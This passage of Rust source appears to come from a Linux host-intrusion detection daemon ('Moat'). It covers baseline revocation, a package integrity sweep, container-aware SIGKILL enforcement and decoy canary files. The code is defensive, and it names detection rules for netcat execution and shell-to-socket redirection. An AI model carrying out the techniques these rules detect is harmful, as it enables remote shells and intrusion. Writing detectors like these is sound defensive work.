        let cgroup = t.cgroup.clone().unwrap_or_default();
        let last = self.throttle_seen.get(&cgroup).copied().unwrap_or(0);
        if now.saturating_sub(last) < 3600 {
            return;
        }
        self.throttle_seen.insert(cgroup.clone(), now);
        if self.in_meta_alert {
            return;
        }
        log::warn!("sensor throttled for {}: events are being dropped", cgroup);
        let meta = crate::rules::sensor_throttled_meta(&cgroup);
        let mut f = Finding::new(crate::rules::SENSOR_THROTTLED, meta, self_proc("throttle"));
        f.hook = "userland".into();
        f.mode = self.mode.clone();
        f.extra_evidence
            .push("events from this cgroup were discarded by the sensor, not by moat".into());
        if !cgroup.is_empty() {
            f.extra_evidence.push(format!("cgroup: {}", cgroup));
        }
        self.in_meta_alert = true;
        let _ = self.emit(f);
        self.in_meta_alert = false;
    }

    /// Record that a protection was weakened, and by whom.
    ///
    /// `who` comes from `SO_PEERCRED` -- the kernel's answer about the process
    /// on the other end of the socket, which the caller cannot forge. Before
    /// this, every mutating command was anonymous: `moatctl ignore --scope rule`
    /// silenced a whole detection class and the only trace was a line in root's
    /// journal, which the user being protected cannot read. An off switch the
    /// attacker can reach and nobody can see them reach is not a control.
    pub fn raise_protection_change(&mut self, action: &str, who: &str, detail: Vec<String>) {
        if self.in_meta_alert {
            return;
        }
        let meta = crate::rules::protection_changed_meta(action, who);
        let mut f = Finding::new(crate::rules::PROTECTION_CHANGED, meta, self_proc(action));
        f.hook = "userland".into();
        f.mode = self.mode.clone();
        f.what_override = Some(format!("{} asked Moat to {}.", who, action));
        f.extra_evidence.push(format!("requested by {}", who));
        f.extra_evidence.extend(detail);
        self.in_meta_alert = true;
        let _ = self.emit(f);
        self.in_meta_alert = false;
    }

    /// One `moat-x-noisy-rule` alert per demotion, naming the top five tuples
    /// and offering both "these are expected" and "keep watching".
    fn raise_noisy_rule(&mut self, d: &Demotion, now: u64) {
        if self.in_meta_alert {
            return;
        }
        let top = self.baseline.top_tuples(&d.rule, 5);
        let meta = crate::rules::noisy_rule_meta(&d.rule, d.count, self.cfg.baseline.noisy_rule_per_day);
        let mut f = Finding::new(crate::rules::NOISY_RULE, meta, self_proc(&d.rule));
        f.hook = "userland".into();
        f.mode = self.mode.clone();
        f.what_override = Some(format!(
            "{} raised {} alerts in the last 24 hours, so Moat moved it to the timeline instead \
             of turning it off.",
            d.rule, d.count
        ));
        f.extra_evidence.push(format!(
            "rolling 24 h count for {}: {} (threshold {})",
            d.rule, d.count, self.cfg.baseline.noisy_rule_per_day
        ));
        // A rule quiet in many shapes at once is the rule being wrong, not one
        // workload being loud. Said here, once, instead of silencing the rule:
        // a rule-wide demotion covers shapes nobody has seen, and on 2026-09-04
        // that hid a real /tmp dropper inside a package install (BASELINE §4).
        if d.patterns_quiet >= self.baseline.noisy_rule_fanout {
            f.extra_evidence.push(format!(
                "{} distinct patterns of {} are now quiet. That is the rule being wrong for this \
                 machine rather than one noisy workload: it wants retuning, or a \
                 `moat.omarchy/tier: signal` declaration if it is a building block other rules \
                 correlate on. Moat has NOT silenced the rest of the rule — a shape nobody has \
                 seen yet still reaches the badge.",
                d.patterns_quiet, d.rule
            ));
        }
        if top.is_empty() {
            f.extra_evidence
                .push("no per-tuple history yet for this rule".into());
        }
        for (i, t) in top.iter().enumerate() {
            f.extra_evidence.push(format!(
                "top {}: {} {}{} — {} time{} on {} day{}",
                i + 1,
                t.exe,
                if t.dir.is_empty() { "" } else { "on " },
                if t.dir.is_empty() { "(no file)".to_string() } else { t.dir.clone() },
                t.count,
                if t.count == 1 { "" } else { "s" },
                t.days.len(),
                if t.days.len() == 1 { "" } else { "s" }
            ));
        }
        let block: String = top.iter().map(|t| t.toml()).collect::<Vec<_>>().join("\n");
        f.extra_options = vec![
            ExplainOption {
                scope: "these-are-expected".into(),
                cmd: format!("moatctl baseline propose --rule {}", d.rule),
                line: if block.is_empty() {
                    format!("# no tuples recorded yet for {}", d.rule)
                } else {
                    block
                },
            },
            ExplainOption {
                scope: "keep-watching".into(),
                cmd: format!("moatctl baseline undemote {}", d.rule),
                line: format!(
                    "# clears the demotion; {} goes back to the Alerts tab and the 24 h window \
                     starts over\n",
                    d.rule
                ),
            },
        ];
        self.in_meta_alert = true;
        self.emit(f);
        self.in_meta_alert = false;
        let _ = now;
    }

    // ------------------------------------------- pacman transactions, LEARNING §1

    /// Everything that happens once, at every start.
    ///
    /// A method rather than four lines in `run`, so the sequence can be tested:
    /// the re-check below is only correct if it is actually PART of startup,
    /// and a call site buried in the daemon loop is one no test can reach.
    pub fn on_start(&mut self, now: u64) {
        self.begin_arming(now);
        self.report_downtime();
        // Re-check every learned entry ONCE, at every start.
        //
        // `on_pacman_change` only acts when the database mtime moved, and a
        // fresh process reads the current mtime as its baseline -- so an entry
        // that a NEW RULE would refuse to write today survives indefinitely, on
        // disk and matching, until some unrelated pacman transaction happens to
        // move the file. The runtime-path withdrawal added on 2026-09-08 had
        // exactly that shape: the gate stopped new entries being written and
        // the old ones sat there.
        //
        // A rule change is not a filesystem event, and waiting for one to
        // notice is how an upgrade silently does nothing. This is the
        // migration, and it costs one pass over the learned set.
        let withdrawn = self.revoke_stale_learned_entries();
        if withdrawn > 0 {
            log::info!("startup: withdrew {} learned entry(ies) on re-check", withdrawn);
        }
    }

    /// Re-read the pacman database when it moved, and re-check every learned
    /// baseline entry against it: an entry whose actor stopped being official is
    /// disabled in place, with a reason, and a low alert says so.
    pub fn on_pacman_change(&mut self) -> usize {
        if !self.provenance.refresh_if_changed() {
            return 0;
        }
        self.revoke_stale_learned_entries()
    }

    /// The re-check itself. Public so it can be driven directly (and tested)
    /// without waiting for a filesystem mtime to move.
    pub fn revoke_stale_learned_entries(&mut self) -> usize {
        let path = self.cfg.paths.baseline_allowlist();
        let mut revoked = 0;
        for e in self.baseline.learned_entries() {
            // An entry whose actor's PATH is not an identity for the code it
            // ran is withdrawn whatever its provenance says.
            //
            // The gate that refuses to learn these was added on 2026-09-08;
            // entries written before it are still on disk, still matching, and
            // still covering scripts nobody observed. Re-checking provenance
            // alone would never withdraw them, because `python3` does not stop
            // being official -- that is the whole reason the entry was wrong.
            //
            // NEVER a human's entry. `Baseline::accept` puts a reviewed
            // proposal in this same collection, and on 2026-09-09 this branch
            // could withdraw one: a person read that proposal and approved it,
            // and a heuristic added later does not get to overrule them. It
            // withdraws what the LEARNER wrote and nothing else.
            // Old approvals have no `accepted_by`: the field was added on
            // 2026-09-09 and every entry written before it deserialises as
            // None, which would make a person's approval indistinguishable from
            // something the learner wrote. The DISK remembers, though --
            // `Baseline::accept` writes "accepted by <who>" into the block's
            // comment -- so that is the backfill, and it runs before the
            // withdrawal reads the field.
            if e.accepted_by.is_none() {
                if let Some(t) = self.baseline.state.tuples.get(&e.key).cloned() {
                    if let Ok(rules) = crate::allowlist::load_file_pub(&path) {
                        if let Some(r) = rules.iter().find(|r| r.spec == t.spec()) {
                            if r.comment.contains("accepted by ") {
                                let who = r
                                    .comment
                                    .split("accepted by ")
                                    .nth(1)
                                    .and_then(|w| w.split_whitespace().next())
                                    .unwrap_or("someone")
                                    .to_string();
                                log::info!(
                                    "baseline: {} was approved by {}; not withdrawing it",
                                    e.key,
                                    who
                                );
                                self.baseline.mark_accepted_by(&e.key, &who);
                                continue;
                            }
                        }
                    }
                }
            }
            if e.accepted_by.is_none()
                && crate::provenance::path_is_not_identity(crate::util::basename(&e.exe))
            {
                let reason = format!(
                    "{}: {} runs code chosen by its arguments, so this entry names the \
                     runtime and not the code it ran -- it would cover scripts nobody has \
                     seen. Write it by hand with `script = ...` if it is expected.",
                    e.rule,
                    crate::util::basename(&e.exe)
                );
                // Marked revoked ONLY if the on-disk block is actually gone.
                //
                // The provenance path above marks it either way, which turns a
                // failed write into a permanent false success: `learned_entries`
                // stops returning the entry, so the next re-check never retries
                // it, and a grant that is still live in baseline.toml is
                // recorded as withdrawn. Leaving it un-marked costs a repeated
                // attempt; marking it costs the grant.
                let disabled = match self.baseline.state.tuples.get(&e.key).cloned() {
                    Some(t) => match crate::allowlist::find_index(&path, &t.spec()) {
                        Ok(Some(idx)) => match crate::allowlist::disable_rule(&path, idx, &reason) {
                            Ok(_) => true,
                            Err(err) => {
                                log::warn!("{}: {}", path.display(), err);
                                false
                            }
                        },
                        // No block to disable: nothing is granting anything, so
                        // the entry is safe to mark.
                        Ok(None) => true,
                        // Could not read the file, so whether it still grants
                        // this is unknown -- and an unknown grant must not be
                        // recorded as withdrawn. Same reasoning as the failed
                        // write above: retry beats a permanent false success.
                        Err(err) => {
                            log::warn!(
                                "{}: cannot tell whether it still grants {} ({}); not marking \
                                 it revoked",
                                path.display(),
                                e.key,
                                err
                            );
                            false
                        }
                    },
                    None => true,
                };
                if !disabled {
                    log::warn!(
                        "baseline: {} still grants {}; will retry on the next re-check",
                        path.display(),
                        e.key
                    );
                    continue;
                }
                self.baseline.mark_revoked(&e.key, &reason);
                revoked += 1;

                // Said out loud, like the provenance withdrawal. A rule that
                // stops covering something changes what moat will ask about,
                // and a silent change to that is the thing this project keeps
                // finding it has to apologise for.
                let meta = crate::rules::baseline_revoked_meta(&e.rule);
                let mut f =
                    Finding::new(crate::rules::BASELINE_REVOKED, meta, self_proc(&e.rule));
                f.mode = self.mode.clone();
                f.what_override = Some(format!(
                    "A learned baseline entry for {} was disabled: {} runs code chosen by \
                     its arguments, so the entry named the runtime and not the code.",
                    e.rule, e.exe
                ));
                f.extra_evidence = vec![reason.clone(), format!("entry written {}", e.written)];
                self.in_meta_alert = true;
                self.emit(f);
                self.in_meta_alert = false;
                continue;
            }
            let c = self.provenance.classify_path(&e.exe);
            let (prov, package) = (c.provenance, c.package);
            if prov.is_official() {
                continue;
            }
            let reason = format!(
                "{}: the actor {} is no longer official (now {}{}), so this learned entry no \
                 longer stands",
                e.rule,
                e.exe,
                prov,
                package.map(|p| format!(", package {}", p)).unwrap_or_default()
            );
            // Marked revoked ONLY if the block is actually gone -- the same
            // discipline as the runtime-path branch above, which had it and
            // this one did not. `mark_revoked` removes the entry from
            // `learned_entries`, so a failed rewrite here recorded a withdrawal
            // that never happened and stopped the next re-check retrying it.
            let disabled = match self.baseline.state.tuples.get(&e.key).cloned() {
                Some(t) => match crate::allowlist::find_index(&path, &t.spec()) {
                    Ok(Some(idx)) => match crate::allowlist::disable_rule(&path, idx, &reason) {
                        Ok(_) => true,
                        Err(err) => {
                            log::warn!("{}: {}", path.display(), err);
                            false
                        }
                    },
                    Ok(None) => {
                        log::debug!("baseline: no block in {} for {}", path.display(), e.key);
                        true
                    }
                    // Unreadable is not absent. See the runtime-path branch.
                    Err(err) => {
                        log::warn!(
                            "{}: cannot tell whether it still grants {} ({}); not marking it \
                             revoked",
                            path.display(),
                            e.key,
                            err
                        );
                        false
                    }
                },
                None => true,
            };
            if !disabled {
                log::warn!(
                    "baseline: {} still grants {}; will retry on the next re-check",
                    path.display(),
                    e.key
                );
                continue;
            }
            self.baseline.mark_revoked(&e.key, &reason);
            revoked += 1;

            let meta = crate::rules::baseline_revoked_meta(&e.rule);
            let mut f = Finding::new(crate::rules::BASELINE_REVOKED, meta, self_proc(&e.rule));
            f.mode = self.mode.clone();
            f.what_override = Some(format!(
                "A learned baseline entry for {} was disabled: {} is no longer shipped by a \
                 trusted repository.",
                e.rule, e.exe
            ));
            f.extra_evidence = vec![reason.clone(), format!("entry written {}", e.written)];
            self.in_meta_alert = true;
            self.emit(f);
            self.in_meta_alert = false;
        }
        if revoked > 0 {
            self.reload_allowlist();
        }
        revoked
    }

    /// Periodic upkeep: demotions that have gone quiet, and the two files.
    /// Called wherever `baseline_tick` is: expiring a containment is time
    /// passing, not an event arriving, so it cannot hang off the event path.
    pub fn tick(&mut self, now: u64, force_save: bool) {
        self.baseline_tick(now, force_save);
        self.contain_tick(now);
        self.watchdog_tick(now);
        // Arming first: it owns the verification while it is still working, and
        // `verify_tick` stands down for exactly that window.
        self.arm_tick(now);
        self.verify_tick(now);
        self.sweep_tick(now);
        self.names.prune(now);
    }

    /// Check package-owned executables against their recorded checksums, a
    /// little at a time.
    ///
    /// The classification path only ever reads a file something ELSE already
    /// alerted about, so a trojaned binary that sits quietly is never looked
    /// at -- and sitting quietly is what a good one does. This closes that by
    /// asking without being prompted.
    ///
    /// Incremental on purpose. Hashing every package-owned executable on this
    /// machine is 8,761 files and 6.8 GiB: about 5 seconds in one go, which is
    /// 5 seconds this single-threaded loop is not reading the sensor's log,
    /// and dropped exec events are the one thing moat cannot recover. So it
    /// does ONE package per tick and carries the rest to the next.
    ///
    /// The number that matters is not the total but the WORST package, because
    /// that is one tick's stall. Measured across all 1,124 packages installed
    /// here: 0.191 s (libreoffice-fresh, 275 executables), against a `tick`
    /// that runs every `state_interval_secs` -- 5 by default. The whole sweep
    /// then takes about 1.6 hours of wall clock and no tick pays for more than
    /// one package.
    ///
    /// Executables only. Config files are package-owned too and are MEANT to
    /// be edited -- that is what pacman's backup array and `.pacnew` exist for
    /// -- so sweeping them would report the administrator's own work as
    /// tampering, every day, for ever.
    ///
    /// "Executable" was used as a proxy for "not a config file" and it is not
    /// one: six backup-marked files on this machine are executable, among them
    /// /etc/cron.hourly/snapper and sddm's Xsetup and Xstop, all of which exist
    /// to be customised. The backup array is read directly now, because the
    /// proxy fails on exactly the files people edit most.
    ///
    /// The sweep also RESUMES. Its queue used to live only in memory while
    /// `last_sweep` advanced only on completion, so a daemon restarting more
    /// often than a full pass takes -- ~1.6 hours here -- began again from the
    /// same end of the same list every time. That is not merely wasted work:
    /// the tail of the package set was never reached at all, and a permanent
    /// blind spot is the one outcome a sweep must not have. The cursor is one
    /// package name in `state.json`, so a restart costs at most the package
    /// that was in flight.
    fn sweep_tick(&mut self, now: u64) {
        let every = self.cfg.thresholds.sweep_secs;
        if every == 0 {
            // Off. Not "due immediately": a zero interval read as `now - last
            // >= 0` would sweep on every single tick.
            return;
        }

        if self.sweep.is_none() {
            // A pacman transaction rewrites both the files and the checksums
            // that describe them, so the moment after one is the cheapest time
            // to be sure: everything legitimate matches again by construction.
            let due = self.last_sweep == 0 || now.saturating_sub(self.last_sweep) >= every;
            // A pass interrupted by a restart is finished before the clock is
            // consulted again, or the packages after the cursor are never
            // reached on a machine that restarts often.
            let resuming = !self.sweep_cursor.is_empty();
            if !due && !resuming {
                return;
            }
            let Ok(rd) = std::fs::read_dir(&self.cfg.paths.pacman_local) else {
                // No pacman database is not a finding; it is a machine this
                // check does not apply to.
                self.last_sweep = now;
                self.sweep_cursor.clear();
                return;
            };
            let mut dirs: Vec<PathBuf> = rd
                .flatten()
                .map(|e| e.path())
                .filter(|p| p.join("mtree").is_file())
                .collect();
            // Sorted so that "everything after the cursor" is a meaningful
            // statement at all -- readdir order is not stable across restarts.
            dirs.sort();
            let total = dirs.len();
            if resuming {
                let cursor = self.sweep_cursor.clone();
                dirs.retain(|p| {
                    p.file_name().map(|n| n.to_string_lossy().into_owned()) > Some(cursor.clone())
                });
                log::info!(
                    "integrity sweep: resuming after {}, {} of {} packages left",
                    cursor,
                    dirs.len(),
                    total
                );
            } else {
                log::info!("integrity sweep: {} packages to check", total);
            }
            if dirs.is_empty() {
                self.last_sweep = now;
                self.sweep_cursor.clear();
                return;
            }
            // `pop` takes from the end, so reverse to walk in sorted order and
            // keep the cursor monotonic.
            dirs.reverse();
            self.sweep = Some(dirs);
        }

        let Some(dirs) = self.sweep.as_mut() else {
            return;
        };
        let Some(dir) = dirs.pop() else {
            self.sweep = None;
            self.last_sweep = now;
            self.sweep_cursor.clear();
            log::info!("integrity sweep: finished");
            self.write_state();
            return;
        };
        // Recorded before the work, not after: a package that makes the sweep
        // crash must not be retried on every restart for ever.
        self.sweep_cursor = dir
            .file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_default();

        let label = self
            .provenance
            .db()
            .label_of_dir(&dir)
            .unwrap_or_else(|| dir.file_name().unwrap_or_default().to_string_lossy().into());

        // Read once per package, not once per file.
        let backup = crate::provenance::backup_paths(&dir);

        for (path, want) in crate::mtree::entries(&dir) {
            // Pacman's backup array: files shipped by the package and expected
            // to be edited. Their recorded digest is the shipped one, so it
            // stops matching the moment anyone does what the file is for.
            if backup.contains(&path) {
                continue;
            }
            let Ok(meta) = std::fs::symlink_metadata(&path) else {
                continue;
            };
            // Symlinks have no digest of their own and directories are not
            // files; both are already absent from `entries`, but a path can
            // have BECOME one since the package was installed.
            if !meta.is_file() {
                continue;
            }
            use std::os::unix::fs::PermissionsExt;
            if meta.permissions().mode() & 0o111 == 0 {
                continue;
            }
            if meta.len() != want.size {
                self.report_swept(&path, &label, &format!(
                    "the bytes on disk are {} where {} recorded {}, so this is not the file the \
                     package shipped",
                    meta.len(),
                    label,
                    want.size
                ));
                continue;
            }
            let Some(have) = crate::mtree::sha256_file(&path) else {
                continue;
            };
            if have != want.sha256 {
                self.report_swept(&path, &label, &format!(
                    "the sha256 on disk ({}) is not the one {} recorded ({}), so this is not the \
                     file the package shipped",
                    &have[..12.min(have.len())],
                    label,
                    &want.sha256[..12.min(want.sha256.len())]
                ));
            }
        }
    }

    /// Record a (path, reason) as reported. `false` when it already was.
    ///
    /// The cap is here rather than at the two call sites so they cannot
    /// disagree about it.
    fn remember_modified(&mut self, key: String) -> bool {
        const MAX: usize = 512;
        if self.modified_reported.contains(&key) {
            return false;
        }
        self.modified_reported.push_back(key);
        while self.modified_reported.len() > MAX {
            self.modified_reported.pop_front();
        }
        true
    }

    /// The sweep's half of the once-per-(path, reason) guard, so a file found
    /// by the sweep and then by an alert is one finding rather than two.
    fn report_swept(&mut self, path: &str, package: &str, why: &str) {
        let key = format!("{}\0{}", path, why);
        if !self.remember_modified(key) {
            return;
        }
        self.write_state();
        self.in_meta_alert = true;
        self.emit_modified(path, package, why, self_proc("integrity sweep"));
        self.in_meta_alert = false;
    }

    pub fn baseline_tick(&mut self, now: u64, force_save: bool) {
        // Evict the dedupe map here, or it grows forever.
        //
        // The `dedupe_secs` filter makes an old entry INEFFECTIVE; it never
        // removed one. The key is (rule, exe, file path), all attacker-chosen,
        // so a loop touching a fresh path each time grew a permanent map -- and
        // because a miss is also what triggers an incident capture, the same
        // loop rolled the 200-directory retention window and evicted real
        // evidence while it did it.
        let window = self.cfg.thresholds.dedupe_secs;
        self.dedupe
            .retain(|_, v| now.saturating_sub(v.first_seen) < window.max(1));

        for rule in self.baseline.clear_stale_demotions(now) {
            log::info!("noise guard: {} is quiet again; the demotion is cleared", rule);
        }
        // An install whose exit line we never saw (restart, rotation, a dropped
        // event) would otherwise sit in the tracker for ever.
        // `ChainStore::note` prunes on every observation, so the bound holds
        // even here; this is for the machine that goes quiet with a chain open,
        // which would otherwise hold it until the next alert.
        self.chains.prune(now);
        let dropped = self.receipts.prune(now, 6 * 3_600);
        if dropped > 0 {
            log::debug!("receipts: dropped {} install(s) with no exit", dropped);
        }
        self.rarity.save_if_due(now, force_save);
        self.baseline.save_if_due(now, force_save);
    }

    /// A userland rule that enforces in the daemon (currently only
    /// `moat-pkg-subtree-netcat-exec`) kills **only** in enforce mode, and only
    /// after `/proc/<pid>` proves the pid is still the process the finding
    /// names — the same start-time check the `kill` socket command uses, so a
    /// recycled pid is never signalled.
    ///
    /// Returns whether the process was actually killed; the outcome is recorded
    /// as evidence either way, because "we tried and it was already gone" and
    /// "we killed it" are different facts.
    /// Did this run in a container, for the BADGE? The sensor when it answers,
    /// the ancestry when it does not -- see `util::ancestry_looks_containerised`
    /// for why both are needed and what the fallback costs.
    ///
    /// Display only. Never ask this before acting: see
    /// [`Daemon::containerised_for_enforcement`].
    pub fn containerised(&self, proc: &ProcInfo, ancestry: &[ProcInfo]) -> bool {
        proc.in_container.unwrap_or_else(|| {
            let chain: Vec<String> = ancestry.iter().map(|a| a.exe.clone()).collect();
            crate::util::ancestry_looks_containerised(&chain)
        })
    }

    /// Might the paths this ALERT names belong to a container?
    ///
    /// The READER's question, and the mirror image of [`Daemon::may_act_on`].
    /// Both ask about the same fact and take opposite defaults, on purpose:
    ///
    /// * acting on a container is refused only on the SENSOR's word, because an
    ///   exemption granted on a forged ancestor is immunity from enforcement;
    /// * reading a container's path is refused on ANY hint, because following
    ///   it opens a host file that merely shares the name, and a forged hint
    ///   costs a missing artefact rather than a disclosure.
    ///
    /// Two functions rather than one with a flag, so a call site cannot pick
    /// the wrong default by leaving an argument at its zero value.
    pub fn may_be_container_path(a: &Alert) -> bool {
        a.process.in_container.unwrap_or_else(|| {
            let chain: Vec<String> = a.process.ancestry.iter().map(|x| x.exe.clone()).collect();
            crate::util::ancestry_looks_containerised(&chain)
        })
    }

    /// May moat act on the thing this ALERT names?
    ///
    /// The one question every destination asks, in one place. Four call sites
    /// had grown four copies of it -- the chain gate, the tree kill's target
    /// filter, quarantine, and the containment evidence collector -- and each
    /// was found and fixed separately over two days, which is the argument for
    /// this existing at all. A copied expression cannot protect the next
    /// caller.
    ///
    /// The SENSOR only, as everywhere an action is decided
    /// (`containerised_for_enforcement`): a forged ancestor named `runc` must
    /// not make anything un-actionable. Unknown means actionable, which is the
    /// opposite of the badge's default and deliberately so -- an action refused
    /// on evidence nobody produced is a hiding place, while a badge shown on
    /// the same absence is only noise.
    ///
    /// Note the ONE place that must not use this: `incident::capture`. It does
    /// not act, it READS, and following a container's path there reaches a host
    /// file that merely shares the name. There the display answer is right and
    /// "might be a container" must mean "do not touch it".
    pub fn may_act_on(a: &Alert) -> bool {
        a.process.in_container != Some(true)
    }

    /// Did this run in a container, for a DECISION TO ACT? The sensor, and
    /// nothing else.
    ///
    /// `util::ancestry_looks_containerised` matches basenames, and its own doc
    /// promises the quietening it buys reaches "only down to the TIMELINE,
    /// never out of the record, never past enforcement". On 2026-09-08 I used
    /// the display answer to gate `maybe_enforce` and `chain_gate` and broke
    /// exactly that promise: any process with an ancestor named `runc` --
    /// which needs no privilege, no container and no docker access, only the
    /// ability to name a file -- became un-killable and un-quarantinable, and
    /// one such ancestor covers every descendant at once.
    ///
    /// The kernel's answer cannot be spoofed that way, so it is the only one
    /// allowed to stop an action. Unknown means NOT exempt: an action refused
    /// on evidence nobody produced is a hiding place, and the safe direction
    /// for enforcement is the opposite of the safe direction for a badge.
    ///
    /// The real container protection is the kernel policy split
    /// (`render::split_container_enforcement`), which is namespace-based and
    /// not forgeable. This is the userspace backstop, not the mechanism.
    pub fn containerised_for_enforcement(&self, proc: &ProcInfo) -> bool {
        proc.in_container == Some(true)
    }

    fn maybe_enforce(&self, f: &mut Finding) -> bool {
        if !f.request_kill {
            return false;
        }
        // Enforcement stops at the namespace boundary, in userspace too.
        //
        // The kernel half of this has been true since the policy split
        // (`render::split_container_enforcement`): a deny or a kill selector is
        // scoped to the host mount namespace. The USERSPACE half was never
        // written, so a userland rule armed with `set mode enforce --rule X`
        // could SIGKILL a process inside a container -- while the Settings
        // screen said, in as many words, "Moat never blocks anything inside a
        // container either way". A promise the code does not keep is worse than
        // a promise not made.
        //
        // A container is somebody else's process tree. Killing into it takes
        // down a build step or a service replica with an errno its owner cannot
        // trace back to this machine's security tool.
        if self.containerised_for_enforcement(&f.proc) {
            f.extra_evidence.push(
                "enforce mode: NOT killed — this ran in a container, and moat does \
                 not enforce across a namespace boundary"
                    .into(),
            );
            return false;
        }
        // `mode_for`, not `self.mode`. The rule asked because IT is armed --
        // either daemon-wide or on its own -- and reading the daemon-wide mode
        // here vetoed every per-rule arming: `moatctl set mode enforce --rule
        // moat-shell-stdio-socket` recorded the arming, the rule set
        // `request_kill`, and this returned false because the daemon was still
        // in monitor. Belt and braces either way: the rule checks first.
        if self.mode_for(&f.rule) != "enforce" {
            return false;
        }
        let pid = f.proc.pid;
        let start = util::normalize_ts(&f.proc.start_time);
        if pid <= 1 {
            f.extra_evidence
                .push("enforce mode: no usable pid to signal".into());
            return false;
        }
        if let Err(e) = crate::control::verify_pid(pid, &start, &f.proc.exe) {
            log::warn!("{}: not killing pid {}: {}", f.rule, pid, e);
            f.extra_evidence.push(format!(
                "enforce mode: pid {} was NOT killed — {}",
                pid, e
            ));
            return false;
        }
        let rc = unsafe { libc::kill(pid as libc::pid_t, libc::SIGKILL) };
        if rc == 0 {
            log::info!("{}: SIGKILL sent to pid {} (enforce mode)", f.rule, pid);
            f.extra_evidence.push(format!(
                "enforce mode: moatd sent SIGKILL to pid {} after verifying its start time",
                pid
            ));
            true
        } else {
            let e = std::io::Error::last_os_error();
            log::warn!("{}: kill({}) failed: {}", f.rule, pid, e);
            f.extra_evidence.push(format!(
                "enforce mode: pid {} was NOT killed — kill() failed: {}",
                pid, e
            ));
            false
        }
    }

    /// NOTES §7: `action: KPROBE_ACTION_SIGKILL` is reported in monitor mode
    /// too. Only a `process_exit` carrying `signal: SIGKILL` proves the kill.
    fn confirm_kill(&mut self, exec_id: &str, signal: Option<&str>) {
        let Some(alert_id) = self.pending_kill.remove(exec_id) else {
            return;
        };
        if signal != Some("SIGKILL") {
            log::debug!(
                "alert {}: policy asked for a kill but exit signal was {:?}; action_taken stays none",
                alert_id,
                signal
            );
            return;
        }
        let u = UpdateLine::new(&alert_id).set("action_taken", Value::from("killed"));
        if let Err(e) = self.store.append_update(&u) {
            log::error!("alerts.jsonl: {}", e);
        } else {
            log::info!("alert {}: kill confirmed by process_exit SIGKILL", alert_id);
        }
    }

    pub fn mark(&mut self, id: &str, key: &str, value: Value) -> Result<(), String> {
        self.store
            .append_update(&UpdateLine::new(id).set(key, value))
            .map_err(|e| e.to_string())
    }

    /// `mark`, plus WHO asked.
    ///
    /// Used by every ack path. The bulk cuts already raised a protection
    /// change; the single and enumerated paths recorded nothing at all, so a
    /// process that could read the alert list could also clear the badge and
    /// leave no trace of having done it. The privilege is not the fix -- see
    /// `Alert::acked_by` -- the attribution is.
    pub fn mark_by(&mut self, id: &str, key: &str, value: Value, who: &str) -> Result<(), String> {
        let mut line = UpdateLine::new(id).set(key, value);
        if !who.is_empty() {
            line = line.set("acked_by", Value::from(who.to_string()));
        }
        self.store.append_update(&line).map_err(|e| e.to_string())
    }

    pub fn find_alert(&self, id: &str) -> Option<Alert> {
        self.store.find(id)
    }

    // ----------------------------------------------------------------- status

    /// The mode that actually governed this rule, which is not always the
    /// daemon's.
    ///
    /// A rule armed with `set mode enforce --rule NAME` kills in the kernel
    /// while the daemon stays in monitor, so recording the daemon's mode
    /// produced an alert reading `action: killed` next to `mode: monitor` —
    /// a record that contradicts itself, and the third time today that a
    /// stored field disagreed with what actually happened.
    pub fn mode_for(&self, rule: &str) -> String {
        if self.enforcing_rules.contains(rule) {
            "enforce".to_string()
        } else {
            self.mode.clone()
        }
    }

    /// Plant or remove the decoys, then make the kernel agree with the manifest.
    ///
    /// The order matters in both directions and is not symmetric. Planting
    /// writes the files FIRST and loads the policy second, because a policy
    /// naming paths that do not exist yet is a rule that cannot fire. Removing
    /// unloads the policy FIRST, because a live rule whose files have just been
    /// deleted is the same broken state arrived at from the other side -- and
    /// worse, it would be moat's own `remove` that trips it.
    pub fn set_canaries(&mut self, on: bool, per_kind: usize) -> Result<(String, Vec<String>), String> {
        let manifest_path = self.cfg.paths.canaries();
        let mut manifest = crate::canary::Manifest::load(&manifest_path);
        let mut failures: Vec<String> = Vec::new();

        let summary = if on {
            let homes = crate::util::human_homes(&self.cfg.paths.passwd);
            let existing: Vec<String> = manifest.paths();
            let mut planted = 0usize;
            let now = crate::util::unix_secs();
            for (kind, path) in crate::canary::plan(&homes, per_kind) {
                if existing.iter().any(|p| p == &path.display().to_string()) {
                    continue;
                }
                match crate::canary::plant(kind, &path, now) {
                    Ok(c) => {
                        manifest.canaries.push(c);
                        planted += 1;
                    }
                    // One unwritable directory is not a reason to abandon the
                    // rest: /root may not exist, /var/tmp may be a read-only
                    // mount, and decoys in the other four places are still
                    // worth having.
                    //
                    // But it IS a reason to say so. The first cut only logged
                    // this, and on 2026-09-10 `canary --on` planted two files
                    // in /tmp, failed five times on EROFS, and reported "2
                    // decoy file(s) planted" as a success -- a security feature
                    // reporting that it was watching /etc and /root when it was
                    // watching neither. A partial plant that looks like a whole
                    // one is worse than a plant that fails outright.
                    Err(e) => {
                        log::warn!("canary: {}", e);
                        failures.push(e);
                    }
                }
            }
            if manifest.canaries.is_empty() {
                return Err("could not plant a single decoy; nothing was changed".into());
            }
            manifest.save(&manifest_path)?;
            format!("{} decoy file(s) planted", planted)
        } else {
            // Unload before deleting -- see above.
            self.tetra_policy(&["tp", "delete", "moat-canary-file-read"]);
            let mut removed = 0usize;
            let mut kept: Vec<crate::canary::Canary> = Vec::new();
            for c in manifest.canaries.drain(..) {
                match crate::canary::remove(std::path::Path::new(&c.path)) {
                    Ok(_) => removed += 1,
                    // Someone put a real file at that path after we planted
                    // ours. It stays, and so does the record of it, so the next
                    // `canary on` does not try to plant over it.
                    Err(e) => {
                        log::warn!("canary: {}", e);
                        kept.push(c);
                    }
                }
            }
            manifest.canaries = kept;
            manifest.save(&manifest_path)?;
            format!("{} decoy file(s) removed", removed)
        };

        let opts = crate::render::RenderOptions {
            bpf_lsm: crate::render::bpf_lsm_available(),
            templates_dir: &self.cfg.paths.templates_dir,
            out_dir: &self.cfg.paths.policies_dir,
            export_allowlist: Some(&self.cfg.paths.export_allowlist),
            passwd: &self.cfg.paths.passwd,
            homes: None,
            telemetry: self.cfg.telemetry.clone(),
            canaries: manifest.paths(),
            names_enabled: self.cfg.names.enabled,
            exclusions: self.kernel_exclusions.clone(),
            contain_slots: self.cfg.contain.max,
        };
        crate::render::render(&opts).map_err(|e| format!("render: {}", e))?;

        if on {
            let path = self.rendered_path("moat-canary-file-read")?;
            self.tetra_policy(&["tp", "delete", "moat-canary-file-read"]);
            if !self.tetra_policy(&["tp", "add", &path]) {
                return Err(format!(
                    "{} -- but the policy could not be loaded; run \
                     `sudo systemctl restart tetragon` to arm it",
